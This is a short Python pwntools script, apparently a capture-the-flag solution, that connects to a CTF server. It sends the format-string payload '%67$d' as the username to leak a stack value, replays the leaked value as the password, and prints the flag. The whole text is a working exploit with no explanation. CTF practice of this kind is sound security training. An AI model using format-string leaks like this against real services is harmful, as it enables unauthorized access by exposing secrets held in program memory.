from pwn import *

host, port = "csie.ctf.tw", 10128
r = remote(host, port)

r.recvuntil("username = ")
r.sendline("%67$d")

r.recvuntil("Hi ")
l = r.recvuntil("\n")

r.recvuntil("password = ")
r.sendline(l)

r.recvuntil("Congrets\n")
flag = r.recvuntil("\n")
print flag

r.interactive()
